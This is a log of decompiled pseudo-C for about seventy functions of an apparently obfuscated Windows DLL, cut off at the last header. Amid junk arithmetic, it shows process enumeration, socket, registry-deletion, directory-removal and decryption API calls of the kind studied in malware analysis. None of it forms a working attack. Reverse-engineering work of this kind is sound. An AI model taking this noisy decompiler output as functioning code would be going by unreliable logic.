null

Logs:
# Decompiled Functions: index 1100-1199

Total requested: 100, succeeded: 100, failed: 0

## Function: FUN_18004fbf8 (0x18004fbf8)

```c

void FUN_18004fbf8(void)

{
  return;
}


```

---

## Function: FUN_18004fc90 (0x18004fc90)

```c

longlong FUN_18004fc90(void)

{
  longlong lVar1;
  ulonglong in_R11;
  longlong unaff_R12;
  longlong unaff_R13;
  undefined8 local_28;
  
  lVar1 = CreateToolhelp32Snapshot(0xb413d9b003601d0c,&DAT_1800d4c58,local_28,&DAT_1800d5697);
  if (lVar1 == 0) {
    in_R11 = (in_R11 * 0x1000000 - (unaff_R12 + -0x19)) + unaff_R13 * 0x2000000 + 0xf29c0399;
  }
  return -10 - (ulonglong)(SEXT816(0) != SEXT816(0) * SEXT816((longlong)(in_R11 >> 0x16)));
}


```

---

## Function: FUN_18004fd58 (0x18004fd58)

```c

undefined1 * FUN_18004fd58(void)

{
  undefined1 local_28 [8];
  
  FUN_180047858(0xed1a46d7cf64c800,0,0);
  return local_28;
}


```

---

## Function: FUN_18004fdc0 (0x18004fdc0)

```c

undefined8 FUN_18004fdc0(void)

{
  FUN_18003cf98();
  return 0xc93cdeb2;
}


```

---

## Function: FUN_18004fe48 (0x18004fe48)

```c

void FUN_18004fe48(undefined8 param_1,undefined8 param_2,longlong param_3,ulonglong param_4)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong unaff_RSI;
  longlong lVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  longlong in_R11;
  longlong unaff_R12;
  
  lVar3 = param_3 + -2 >> 1;
  uVar1 = unaff_R12 * -0x5b7eca86b11ca8d6 * lVar3;
  uVar4 = lVar3 - in_R11;
  uVar5 = param_4 & uVar4;
  uVar2 = uVar1 + 5 & unaff_RSI;
  uVar6 = uVar5 - uVar2;
  uVar7 = uVar6 | uVar2;
  WSASocketW((uVar2 - 5) -
             (ulonglong)
             ((POPCOUNT(uVar7 & uVar2 & 0xff) & 1U) != 0 &&
             ((unaff_R12 * -0x5b7eca86b11ca8d5 | uVar1) + uVar5 | uVar6) - 0xc < uVar7),
             0x33e52693b0fbea99,uVar4 ^ 0x18adb69c2da2e151);
  return;
}


```

---

## Function: FUN_18004ff38 (0x18004ff38)

```c

longlong FUN_18004ff38(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  longlong lVar2;
  
  BVar1 = RemoveDirectoryA(&DAT_1800d2bae);
  lVar2 = 0;
  if (CONCAT44(extraout_var,BVar1) != 0) {
    lVar2 = (CONCAT44(extraout_var,BVar1) + 0x1e) * 0x20;
  }
  return lVar2;
}


```

---

## Function: FUN_18004ffe0 (0x18004ffe0)

```c

/* WARNING: Removing unreachable block (ram,0x000180050048) */

longlong FUN_18004ffe0(undefined8 param_1,longlong param_2)

{
  HKEY hKey;
  LPCWSTR lpSubKey;
  longlong unaff_RBX;
  longlong unaff_RSI;
  undefined *puVar1;
  REGSAM samDesired;
  PHKEY in_stack_ffffffffffffffc8;
  
  hKey = (HKEY)&stack0xffffffffffffffe0;
  puVar1 = &DAT_1800d3ac3;
  samDesired = (REGSAM)&stack0xffffffffffffffc8;
  lpSubKey = (LPCWSTR)(param_2 + 3U ^ unaff_RBX + unaff_RSI);
  GetCurrentProcessId();
  RegOpenKeyExW(hKey,lpSubKey,(DWORD)puVar1,samDesired,in_stack_ffffffffffffffc8);
  return (longlong)puVar1 - unaff_RSI;
}


```

---

## Function: FUN_180050070 (0x180050070)

```c

longlong FUN_180050070(undefined8 param_1,longlong param_2)

{
  BCRYPT_KEY_HANDLE hKey;
  NTSTATUS NVar1;
  HANDLE pvVar2;
  undefined4 extraout_var;
  longlong lVar3;
  undefined *puVar4;
  ulonglong unaff_RBX;
  ULONG *unaff_RBP;
  longlong unaff_RSI;
  ulonglong uVar5;
  ULONG unaff_EDI;
  undefined1 *pPaddingInfo;
  PUCHAR unaff_R14;
  ULONG unaff_retaddr;
  PUCHAR in_stack_ffffffffffffffd8;
  ULONG in_stack_ffffffffffffffe0;
  undefined4 uStack_1c;
  
  pPaddingInfo = &stack0xffffffffffffffe0;
  uVar5 = unaff_RSI - 8;
  if (0 < param_2 + 9 >> 0x1f) {
    pPaddingInfo = &stack0xffffffffffffffe0 + (((ulonglong)pPaddingInfo & unaff_RBX) - unaff_RBX);
  }
  hKey = (BCRYPT_KEY_HANDLE)CONCAT44(uStack_1c,in_stack_ffffffffffffffe0);
  pvVar2 = FindFirstFileA((LPCSTR)0x5029594a69e5a70,(LPWIN32_FIND_DATAA)0x0);
  if (pvVar2 != (HANDLE)0x0) {
    uVar5 = unaff_RSI - 0x12;
  }
  puVar4 = &DAT_1800cdd62;
  NVar1 = BCryptDecrypt(hKey,&DAT_1800cdd62,(ULONG)&stack0xfffffffffffffff8,pPaddingInfo,
                        in_stack_ffffffffffffffd8,in_stack_ffffffffffffffe0,unaff_R14,unaff_EDI,
                        unaff_RBP,unaff_retaddr);
  lVar3 = CONCAT44(extraout_var,NVar1);
  if (lVar3 == 0) {
    lVar3 = (uVar5 | (ulonglong)puVar4) - ((longlong)hKey + 0x12);
  }
  return lVar3;
}


```

---

## Function: FUN_180050160 (0x180050160)

```c

void FUN_180050160(void)

{
  int in_EAX;
  int in_R9D;
  REGSAM in_R10D;
  int in_R11D;
  uint unaff_R12D;
  PHKEY in_stack_ffffffffffffffe8;
  
  RegOpenKeyExW((HKEY)s_Alexand_1800c072a,(LPCWSTR)0x0,
                (unaff_R12D & in_R9D - unaff_R12D) -
                (in_EAX << 0x1e | (in_R11D + (unaff_R12D - 0x10)) * unaff_R12D),in_R10D,
                in_stack_ffffffffffffffe8);
  return;
}


```

---

## Function: FUN_1800501e8 (0x1800501e8)

```c

undefined8 FUN_1800501e8(undefined8 param_1,longlong param_2)

{
  undefined8 local_18;
  
  FUN_180029798(&stack0xfffffffffffffff0,param_2 + 0xc,&local_18);
  return local_18;
}


```

---

## Function: FUN_180050288 (0x180050288)

```c

undefined8 FUN_180050288(void)

{
  undefined8 local_30;
  
  FUN_180013fc8();
  return local_30;
}


```

---

## Function: FUN_180050348 (0x180050348)

```c

undefined8 FUN_180050348(void)

{
  return 0xf128769fe3c1b880;
}


```

---

## Function: FUN_1800503b8 (0x1800503b8)

```c

void FUN_1800503b8(void)

{
  RemoveDirectoryA(&DAT_1800cad05);
  return;
}


```

---

## Function: FUN_180050468 (0x180050468)

```c

/* WARNING: Removing unreachable block (ram,0x0001800505d4) */

void FUN_180050468(void)

{
  FUN_18001d1f0();
  FUN_180016078();
  FUN_1800422c8();
  return;
}


```

---

## Function: FUN_180050620 (0x180050620)

```c

longlong FUN_180050620(void)

{
  longlong in_RAX;
  
  return in_RAX + (ulonglong)(in_RAX < 0) + -0xe;
}


```

---

## Function: FUN_1800506b0 (0x1800506b0)

```c

void FUN_1800506b0(void)

{
  FUN_180004868();
  return;
}


```

---

## Function: FUN_180050730 (0x180050730)

```c

/* WARNING: Removing unreachable block (ram,0x000180050769) */

ulonglong FUN_180050730(void)

{
  ulonglong in_RAX;
  ulonglong unaff_RBX;
  
  return in_RAX & unaff_RBX >> 8;
}


```

---

## Function: FUN_1800507b8 (0x1800507b8)

```c

ulonglong FUN_1800507b8(undefined8 param_1,longlong param_2)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  longlong unaff_RSI;
  longlong unaff_RDI;
  ulonglong uVar2;
  ulonglong unaff_R13;
  
  uVar2 = (unaff_RDI + -8) - (ulonglong)(param_2 + 0x11U < 3);
  uVar1 = param_2 + 0xeU ^ unaff_R13 >> 2;
  if (uVar1 == 0) {
    unaff_RSI = unaff_RSI + -0x15;
    in_RAX = in_RAX - 0x1c;
    uVar1 = 0;
    uVar2 = uVar2 + unaff_RSI;
  }
  if (0 < (longlong)(uVar2 & in_RAX)) {
    uVar1 = uVar1 & unaff_RSI + in_RAX;
  }
  uVar1 = uVar1 + 0x1e;
  uVar2 = FUN_18001d398();
  return uVar2 | uVar1;
}


```

---

## Function: FUN_180050878 (0x180050878)

```c

void FUN_180050878(void)

{
  FUN_18003f2f0();
  return;
}


```

---

## Function: FUN_180050940 (0x180050940)

```c

void FUN_180050940(void)

{
  FUN_180051d98();
  return;
}


```

---

## Function: FUN_1800509e0 (0x1800509e0)

```c

longlong FUN_1800509e0(void)

{
  undefined1 *puVar1;
  undefined1 local_28 [16];
  
  puVar1 = (undefined1 *)FUN_18003a730();
  if (puVar1 == (undefined1 *)0x0) {
    puVar1 = local_28;
  }
  return (longlong)puVar1 * (longlong)local_28;
}


```

---

## Function: FUN_180050aa0 (0x180050aa0)

```c

/* WARNING: Removing unreachable block (ram,0x000180050ad6) */

void FUN_180050aa0(void)

{
  FUN_180007228();
  FUN_18003f2f0();
  FUN_18004a118();
  return;
}


```

---

## Function: FUN_180050c10 (0x180050c10)

```c

void FUN_180050c10(void)

{
  _time64((__time64_t *)&DAT_1800cd269);
  FUN_1800212e8(0x270b468c4e57ec8);
  return;
}


```

---

## Function: FUN_180050d20 (0x180050d20)

```c

/* WARNING: Removing unreachable block (ram,0x000180050e6b) */
/* WARNING: Removing unreachable block (ram,0x000180050e92) */

void FUN_180050d20(void)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  longlong in_R9;
  ulonglong uVar4;
  undefined1 *puVar5;
  ulonglong unaff_R12;
  ulonglong local_158;
  undefined1 local_b8 [8];
  undefined1 local_b0 [152];
  
  uVar4 = in_R9 + 0x11;
  puVar5 = local_b0;
  puVar3 = local_b0;
  uVar2 = 0x9e490fb219082ee8;
  lVar1 = FUN_180033180();
  if (lVar1 == 0) {
    puVar5 = (undefined1 *)((ulonglong)puVar5 ^ uVar2);
    puVar3 = puVar3 + (longlong)puVar5;
    unaff_R12 = unaff_R12 - uVar4;
  }
  if ((longlong)((ulonglong)puVar5 & (ulonglong)puVar3) < 0) {
    puVar3 = (undefined1 *)((ulonglong)puVar3 ^ uVar4);
    unaff_R12 = unaff_R12 | local_158;
  }
  CreateToolhelp32Snapshot(local_b8,(longlong)puVar3 * unaff_R12 ^ (local_158 | (ulonglong)puVar3));
  return;
}


```

---

## Function: FUN_180050f00 (0x180050f00)

```c

ulonglong FUN_180050f00(void)

{
  undefined1 *puVar1;
  byte bVar2;
  undefined1 local_60 [16];
  undefined1 local_50 [40];
  ulonglong local_28;
  
  FUN_180004580();
  FUN_18002db20();
  bVar2 = 0;
  puVar1 = local_50;
  FUN_18003aad0();
  return (ulonglong)&local_28 ^
         (longlong)puVar1 * ((((ulonglong)local_60 & local_28) - 8) - (ulonglong)bVar2);
}


```

---

## Function: FUN_1800510d0 (0x1800510d0)

```c

/* WARNING: Removing unreachable block (ram,0x000180051139) */

longlong FUN_1800510d0(void)

{
  ulonglong uVar1;
  ulonglong unaff_RBX;
  ulonglong unaff_RBP;
  ulonglong unaff_RSI;
  longlong unaff_RDI;
  ulonglong in_R11;
  longlong unaff_R12;
  ulonglong unaff_R13;
  
  uVar1 = 0;
  if ((unaff_R13 & 0x751b174) == 0) {
    uVar1 = -unaff_RDI;
    in_R11 = in_R11 | unaff_R12 * in_R11;
    unaff_RBX = unaff_RBX >> 0x13;
  }
  return (longlong)(&stack0x00000004 + -unaff_RBX) * 0x1e +
         (unaff_RBP ^
         -(ulonglong)
          ((undefined1 *)
           (in_R11 + (uVar1 | unaff_RSI) + 0x19 + (ulonglong)((longlong)(unaff_RSI << 1) < 0)) <
          &stack0xfffffffffffffff8) - 0x16);
}


```

---

## Function: FUN_1800511d8 (0x1800511d8)

```c

undefined8 FUN_1800511d8(void)

{
  FUN_180036688();
  FUN_180012a00();
  FUN_180035770();
  FUN_180013358();
  return 0x826b09debb2bc099;
}


```

---

## Function: FUN_180051468 (0x180051468)

```c

/* WARNING: Removing unreachable block (ram,0x000180051590) */

ulonglong FUN_180051468(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined1 local_148 [120];
  undefined8 uStack_d0;
  undefined1 local_80 [80];
  
  uStack_d0 = 0x180051496;
  FUN_180007ea0();
  uStack_d0 = 0x1800514af;
  FUN_18003aad0();
  uVar3 = 0;
  uStack_d0 = 0x180051514;
  BVar1 = RemoveDirectoryA((LPCSTR)0x69e1995bde21cec7);
  if (CONCAT44(extraout_var,BVar1) != 0) {
    uVar3 = (uVar3 & CONCAT44(extraout_var,BVar1)) << 5;
  }
  uVar2 = 0xafa42a3c;
  if (local_80 + uVar3 != (undefined1 *)0x0) {
    uVar2 = (ulonglong)(local_80 + uVar3 + (0xafa42a3c - (longlong)local_148)) >> 0x1d;
  }
  return uVar2;
}


```

---

## Function: FUN_180051628 (0x180051628)

```c

longlong FUN_180051628(void)

{
  longlong lVar1;
  ulonglong uVar2;
  longlong unaff_RSI;
  longlong unaff_RDI;
  ulonglong in_R9;
  LPRECT in_R10;
  ulonglong local_70;
  
  lVar1 = FUN_180038848();
  uVar2 = (unaff_RSI + -0x1e) - (ulonglong)(0xffffffffffffffec < in_R9);
  if (lVar1 == 0) {
    unaff_RDI = unaff_RDI + 0x13;
    uVar2 = local_70;
  }
  if (unaff_RDI != 0) {
    in_R10 = (LPRECT)((ulonglong)in_R10 & (uVar2 | (ulonglong)in_R10));
  }
  GetWindowRect((HWND)0x0,in_R10);
  uVar2 = FUN_180001720();
  lVar1 = 0;
  if (uVar2 != 0) {
    lVar1 = (uVar2 & 0x1ffffffffffffff) << 3;
  }
  return lVar1 + -0x1d;
}


```

---

## Function: FUN_1800517c8 (0x1800517c8)

```c

/* WARNING: Removing unreachable block (ram,0x000180051826) */

undefined8 FUN_1800517c8(void)

{
  FUN_1800535b8();
  return 0x94be9b0a;
}


```

---

## Function: FUN_1800518a8 (0x1800518a8)

```c

void FUN_1800518a8(void)

{
  FUN_180043178();
  return;
}


```

---

## Function: FUN_180051928 (0x180051928)

```c

undefined8 FUN_180051928(void)

{
  FUN_180010088();
  RemoveDirectoryA((LPCSTR)0xa0bc4c9263a9201a);
  return 0xb9cc963e;
}


```

---

## Function: FUN_180051b48 (0x180051b48)

```c

/* WARNING: Removing unreachable block (ram,0x000180051b88) */

undefined8 FUN_180051b48(void)

{
  return 0;
}


```

---

## Function: FUN_180051bd8 (0x180051bd8)

```c

void FUN_180051bd8(void)

{
  FUN_18004fb58();
  return;
}


```

---

## Function: FUN_180051c68 (0x180051c68)

```c

void FUN_180051c68(void)

{
  return;
}


```

---

## Function: FUN_180051ce0 (0x180051ce0)

```c

undefined8 FUN_180051ce0(void)

{
  PHKEY in_stack_ffffffffffffffc8;
  HKEY__ local_30 [4];
  WCHAR local_20 [8];
  
  RegOpenKeyExW(local_30,local_20,0x800d22dd,0x800baea0,in_stack_ffffffffffffffc8);
  return 0xd117e237;
}


```

---

## Function: FUN_180051d98 (0x180051d98)

```c

longlong FUN_180051d98(void)

{
  longlong in_RAX;
  
  return in_RAX >> 6;
}


```

---

## Function: FUN_180051e08 (0x180051e08)

```c

/* WARNING: Removing unreachable block (ram,0x000180051e35) */

void FUN_180051e08(void)

{
  return;
}


```

---

## Function: FUN_180051e70 (0x180051e70)

```c

longlong FUN_180051e70(void)

{
  longlong lVar1;
  
  lVar1 = FUN_180056230(0);
  return lVar1 + 0x13;
}


```

---

## Function: FUN_180051ef0 (0x180051ef0)

```c

undefined8 FUN_180051ef0(void)

{
  return 0x5b08955b;
}


```

---

## Function: FUN_180051ff8 (0x180051ff8)

```c

void FUN_180051ff8(void)

{
  undefined1 *puVar1;
  longlong lVar2;
  ulonglong in_R10;
  undefined1 local_28 [16];
  
  puVar1 = local_28;
  if ((POPCOUNT(in_R10 & 10) & 1U) != 0) {
    puVar1 = &stack0xfffffffffffffff6;
  }
  lVar2 = (longlong)local_28 * 0x80;
  FUN_180005690();
  FUN_18001a2e0(puVar1,(longlong)local_28,(int)(lVar2 << 0x12));
  return;
}


```

---

## Function: FUN_1800520b0 (0x1800520b0)

```c

void FUN_1800520b0(void)

{
  FUN_180027130();
  return;
}


```

---

## Function: FUN_180052160 (0x180052160)

```c

void FUN_180052160(void)

{
  RemoveDirectoryA((LPCSTR)0x0);
  FUN_180043828();
  FUN_18001dde0();
  return;
}


```

---

## Function: FUN_180052230 (0x180052230)

```c

/* WARNING: Removing unreachable block (ram,0x00018005225d) */

longlong FUN_180052230(undefined8 param_1,undefined8 param_2,ulonglong param_3)

{
  longlong lVar1;
  ulonglong unaff_RBX;
  ulonglong uVar2;
  ulonglong unaff_RSI;
  longlong unaff_RDI;
  ulonglong in_R10;
  ulonglong unaff_R13;
  undefined1 local_res8 [32];
  longlong local_18 [2];
  
  uVar2 = unaff_RBX ^ unaff_R13;
  if ((param_3 & (ulonglong)local_18) == 0) {
    unaff_R13 = (unaff_R13 + unaff_RDI) * 0x40000 + uVar2;
  }
  lVar1 = FUN_18002b1b0(0xb0597e7d2518a4d0,0,(longlong)local_res8);
  if (lVar1 != 0) {
    unaff_RSI = (unaff_RSI ^
                (uVar2 - 0x19) -
                (ulonglong)
                (SEXT816((longlong)(unaff_R13 * unaff_RDI)) !=
                SEXT816((longlong)unaff_R13) * SEXT816(unaff_RDI))) & local_18[0] << 8;
  }
  lVar1 = FUN_180044c80();
  if (lVar1 == 0) {
    unaff_RSI = (unaff_RSI | in_R10) >> 0x1a;
  }
  lVar1 = FUN_1800495c0();
  return lVar1 + unaff_RSI;
}


```

---

## Function: FUN_180052350 (0x180052350)

```c

/* WARNING: Removing unreachable block (ram,0x0001800523c9) */

void FUN_180052350(void)

{
  undefined1 local_res8 [32];
  
  FUN_1800021f0((longlong)&stack0x00000000,(longlong)local_res8);
  return;
}


```

---

## Function: FUN_180052408 (0x180052408)

```c

ulonglong FUN_180052408(void)

{
  errno_t eVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  ulonglong uVar3;
  ulonglong unaff_RDI;
  ulonglong uVar4;
  ulonglong uVar5;
  longlong lVar6;
  ulonglong in_R10;
  ulonglong in_R11;
  ulonglong unaff_R12;
  ulonglong unaff_R13;
  undefined1 *puVar7;
  undefined1 local_18 [16];
  
  uVar3 = 0xdf23e56b76be768;
  eVar1 = strncpy_s((char *)0xd10afa47a41ecb4d,0xdf23e56b76be768,&DAT_1800c6df0,0);
  if (CONCAT44(extraout_var,eVar1) == 0) {
    unaff_RDI = ((unaff_RDI & in_R11) - in_R10) * 0x2000;
    unaff_R12 = (unaff_R12 & uVar3) + uVar3;
    in_R10 = in_R10 - unaff_R12;
  }
  puVar7 = (undefined1 *)(unaff_R13 ^ in_R10);
  uVar2 = 0x7fe19fb1841a9154;
  uVar5 = 0;
  uVar3 = FUN_180034d10();
  if (uVar3 != 0) {
    puVar7 = local_18;
    unaff_RDI = unaff_RDI - (longlong)puVar7;
    in_R10 = in_R10 | unaff_R12;
    uVar2 = uVar2 | uVar3;
  }
  uVar4 = unaff_RDI - 0x12;
  if (uVar3 == 0) {
    uVar4 = uVar4 >> 0x1b;
  }
  lVar6 = 0;
  uVar3 = FUN_180012880(uVar2 + 0x12,in_R10 + 0xb,uVar5);
  if ((longlong)uVar4 < 0) {
    uVar3 = (uVar3 - (longlong)puVar7) - lVar6;
  }
  return uVar3;
}


```

---

## Function: FUN_180052560 (0x180052560)

```c

/* WARNING: Removing unreachable block (ram,0x0001800525d8) */

void FUN_180052560(void)

{
  return;
}


```

---

## Function: FUN_180052618 (0x180052618)

```c

ulonglong FUN_180052618(void)

{
  FUN_180032f68();
  return 0;
}


```

---

## Function: FUN_1800526f0 (0x1800526f0)

```c

undefined8 FUN_1800526f0(void)

{
  ulonglong in_RAX;
  undefined1 *puVar1;
  undefined8 uVar2;
  longlong unaff_RBX;
  ulonglong unaff_RBP;
  ulonglong uVar3;
  longlong lVar4;
  longlong lVar5;
  ulonglong unaff_R12;
  undefined1 auStack_88 [61];
  undefined1 auStack_4b [11];
  undefined1 local_40 [8];
  undefined1 local_38 [40];
  
  lVar5 = (unaff_RBX + -5) - (ulonglong)(0xfffffffffffffffd < in_RAX);
  puVar1 = FUN_180043700();
  if (puVar1 != (undefined1 *)0x0) {
    unaff_R12 = unaff_R12 - (longlong)local_38;
  }
  uVar3 = (longlong)local_38 >> 9;
  lVar4 = 0;
  FUN_18003e688();
  if (((ulonglong)local_40 & unaff_RBP) != 0) {
    unaff_R12 = (unaff_R12 & uVar3) + lVar4 | 0xf611d2adc908f472;
  }
  if ((unaff_R12 & (ulonglong)auStack_88) != 0) {
    unaff_R12 = unaff_R12 + ((ulonglong)local_40 | lVar5 + 7U) ^
                (ulonglong)(auStack_4b + lVar4 * -4);
  }
  if (0 < (longlong)uVar3) {
    unaff_R12 = unaff_R12 << 6;
  }
  uVar2 = 0xa5e887be;
  if (((unaff_R12 | uVar3) & (ulonglong)auStack_88) == 0) {
    uVar2 = 0xa5e887cf;
  }
  return uVar2;
}


```

---

## Function: FUN_180052880 (0x180052880)

```c

/* WARNING: Removing unreachable block (ram,0x000180052949) */
/* WARNING: Removing unreachable block (ram,0x000180052911) */
/* WARNING: Removing unreachable block (ram,0x000180052994) */

longlong FUN_180052880(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  longlong lVar2;
  longlong lVar3;
  
  lVar3 = 0x7d6d2ef8dae5cdf7;
  FUN_180030548();
  _wfopen((wchar_t *)0xca925ec8c335ab20,(wchar_t *)&stack0xffffffffffffffe0);
  BVar1 = RemoveDirectoryA(&DAT_1800baafb);
  lVar2 = CONCAT44(extraout_var,BVar1);
  if (lVar2 == 0) {
    lVar3 = 0x7d6d2ef8dae5ce0c;
    lVar2 = 0;
  }
  return lVar2 - lVar3;
}


```

---

## Function: FUN_180052a60 (0x180052a60)

```c

longlong FUN_180052a60(void)

{
  LSTATUS LVar1;
  undefined4 extraout_var;
  longlong lVar2;
  undefined *puVar3;
  undefined *puVar4;
  longlong in_R10;
  undefined1 *puVar5;
  longlong unaff_R12;
  LPDWORD in_stack_ffffffffffffffc8;
  LPDWORD in_stack_ffffffffffffffd0;
  LPBYTE in_stack_ffffffffffffffd8;
  LPDWORD in_stack_ffffffffffffffe0;
  
  puVar3 = &DAT_1800d0363;
  puVar4 = &DAT_1800c5555;
  puVar5 = &stack0xffffffffffffffd0;
  LVar1 = RegEnumValueA((HKEY)&DAT_1800d0363,0x473196ca,&DAT_1800c5555,(LPDWORD)&DAT_1800c555d,
                        in_stack_ffffffffffffffc8,in_stack_ffffffffffffffd0,
                        in_stack_ffffffffffffffd8,in_stack_ffffffffffffffe0);
  lVar2 = CONCAT44(extraout_var,LVar1);
  if (lVar2 == 0) {
    lVar2 = (unaff_R12 - (in_R10 - (longlong)(puVar5 + (longlong)puVar4))) * 0x800;
  }
  return lVar2 - (longlong)puVar3;
}


```

---

## Function: FUN_180052b08 (0x180052b08)

```c

/* WARNING: Removing unreachable block (ram,0x000180052b2e) */

longlong FUN_180052b08(undefined8 param_1,longlong param_2)

{
  longlong in_RAX;
  longlong lVar1;
  ulonglong unaff_RBX;
  ulonglong unaff_RSI;
  ulonglong uVar2;
  ulonglong in_R10;
  longlong unaff_R12;
  ulonglong uVar3;
  longlong unaff_R13;
  ulonglong uVar4;
  ulonglong local_18;
  
  uVar4 = unaff_R13 * (param_2 + 0x1e);
  uVar3 = unaff_R12 * uVar4;
  if (in_RAX == 0) {
    uVar2 = local_18 & ((unaff_RSI - 6 | uVar3) & uVar3) - 0x12;
    uVar4 = uVar4 & in_R10 & unaff_RSI & uVar2;
    unaff_RBX = (ulonglong)&local_18 & uVar2;
  }
  uVar2 = ((uVar3 | uVar3 ^ 0x1d8dc5da) ^ unaff_RBX) - 9;
  lVar1 = FUN_180029580(uVar3 ^ 0x1d8dc5da,0,0);
  if (lVar1 != 0) {
    lVar1 = lVar1 + (uVar2 - (uVar4 & uVar2));
  }
  return lVar1;
}


```

---

## Function: FUN_180052be8 (0x180052be8)

```c

void FUN_180052be8(void)

{
  FUN_180051d98();
  RtlFreeAnsiString(0,&stack0xfffffffffffffff0,0,&DAT_1800d1fee);
  FUN_18001a6b8();
  return;
}


```

---

## Function: FUN_180052cf0 (0x180052cf0)

```c

undefined8 FUN_180052cf0(void)

{
  FUN_180046d40();
  return 0x5f9f1982;
}


```

---

## Function: FUN_180052d98 (0x180052d98)

```c

/* WARNING: Removing unreachable block (ram,0x000180052de1) */

void FUN_180052d98(void)

{
  return;
}


```

---

## Function: FUN_180052e18 (0x180052e18)

```c

longlong FUN_180052e18(void)

{
  ulonglong uVar1;
  longlong lVar2;
  longlong unaff_RSI;
  
  uVar1 = FUN_180025288();
  lVar2 = uVar1 + 0x18;
  if (-1 < unaff_RSI) {
    lVar2 = (uVar1 - 5) * 0x20000000;
  }
  return lVar2;
}


```

---

## Function: FUN_180052ec0 (0x180052ec0)

```c

/* WARNING: Removing unreachable block (ram,0x000180052f0f) */
/* WARNING: Removing unreachable block (ram,0x000180052f58) */

longlong FUN_180052ec0(void)

{
  longlong in_RAX;
  longlong in_R9;
  
  return in_RAX + in_R9 + -0x22;
}


```

---

## Function: FUN_180052f78 (0x180052f78)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_180052f78(void)

{
  LSTATUS LVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  undefined1 *puVar3;
  
  puVar3 = &DAT_35d0dc3d;
  _DAT_35d0dbfd = 0x180052ffd;
  LVar1 = RegOpenKeyExW((HKEY)0x0,(LPCWSTR)&DAT_1800caa75,0x35d0dc3d,0,_DAT_35d0dc25);
  uVar2 = CONCAT44(extraout_var,LVar1);
  if ((longlong)((ulonglong)puVar3 & CONCAT44(extraout_var,LVar1)) < 0) {
    uVar2 = _DAT_35d0dc3d;
  }
  return uVar2;
}


```

---

## Function: FUN_180053028 (0x180053028)

```c

void FUN_180053028(void)

{
  return;
}


```

---

## Function: FUN_180053080 (0x180053080)

```c

ulonglong FUN_180053080(undefined8 param_1,longlong param_2)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  
  uVar3 = param_2 + 0x18;
  uVar1 = FUN_18001c208();
  uVar2 = 0;
  if (uVar1 != 0) {
    uVar2 = uVar1 & uVar3;
  }
  return uVar2;
}


```

---

## Function: FUN_180053108 (0x180053108)

```c

/* WARNING: Removing unreachable block (ram,0x000180053222) */

undefined1 * FUN_180053108(void)

{
  undefined1 auStack_c [4];
  
  FUN_180050730();
  return auStack_c;
}


```

---

## Function: FUN_180053258 (0x180053258)

```c

void FUN_180053258(void)

{
  FUN_180011768();
  return;
}


```

---

## Function: FUN_1800532c0 (0x1800532c0)

```c

void FUN_1800532c0(void)

{
  return;
}


```

---

## Function: FUN_180053370 (0x180053370)

```c

undefined8 * FUN_180053370(void)

{
  undefined8 *puVar1;
  
  puVar1 = FUN_180044fa0();
  if (puVar1 == (undefined8 *)0x0) {
    puVar1 = (undefined8 *)0x0;
  }
  return puVar1;
}


```

---

## Function: FUN_180053450 (0x180053450)

```c

void FUN_180053450(void)

{
  CHAR local_38 [32];
  
  RemoveDirectoryA(local_38);
  return;
}


```

---

## Function: FUN_180053518 (0x180053518)

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_180053518(void)

{
  return;
}


```

---

## Function: FUN_1800535b8 (0x1800535b8)

```c

undefined1 * FUN_1800535b8(void)

{
  longlong lVar1;
  undefined1 local_40 [32];
  
  RemoveDirectoryA(&DAT_1800cb751);
  lVar1 = -0x22b00eacce4c2b10;
  FUN_180042d90(-0x22b00eacce4c2b10);
  RegDeleteKeyA((HKEY)(lVar1 + 1),&DAT_1800ca3d7);
  return local_40;
}


```

---

## Function: FUN_180053700 (0x180053700)

```c

/* WARNING: Removing unreachable block (ram,0x000180053756) */

ulonglong FUN_180053700(void)

{
  ulonglong uVar1;
  undefined1 *puVar2;
  longlong unaff_RBX;
  ulonglong unaff_RDI;
  undefined1 local_38 [24];
  
  uVar1 = 0;
  puVar2 = local_38;
  RemoveDirectoryA((LPCSTR)0x0);
  return (ulonglong)puVar2 | unaff_RBX * (uVar1 & unaff_RDI);
}


```

---

## Function: FUN_1800537a8 (0x1800537a8)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_1800537a8(void)

{
  int in_R9D;
  
  _DAT_4a95ec20 = 0x180053806;
  BCryptCreateHash((BCRYPT_ALG_HANDLE)0x0,(BCRYPT_HASH_HANDLE *)&DAT_4a95ec58,&DAT_1800caa65,
                   in_R9D + 0x12,pURam000000004a95ec48,_DAT_4a95ec50,_DAT_4a95ec58);
  return 0x4a95ec48;
}


```

---

## Function: FUN_180053868 (0x180053868)

```c

void FUN_180053868(void)

{
  FindFirstFileA(&DAT_1800c0802,(LPWIN32_FIND_DATAA)&stack0xffffffffffffffd8);
  FUN_180033d70(0,0);
  FUN_180013fc8();
  return;
}


```

---

## Function: FUN_180053940 (0x180053940)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x000180053a19) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_180053940(void)

{
  longlong lVar1;
  
  _DAT_db5dabcef017be1c = 0x18005397a;
  FUN_18000de70();
  _DAT_db5dabcef017be1c = 0x1800539df;
  FUN_180042168();
  _DAT_db5dabcef017be1c = 0x180053a56;
  lVar1 = FUN_180047290();
  if (lVar1 == 0) {
    lVar1 = -0xd;
  }
  return lVar1;
}


```

---

## Function: FUN_180053a80 (0x180053a80)

```c

void FUN_180053a80(void)

{
  return;
}


```

---

## Function: FUN_180053ae0 (0x180053ae0)

```c

void FUN_180053ae0(void)

{
  FUN_18004c298();
  return;
}


```

---

## Function: FUN_180053c00 (0x180053c00)

```c

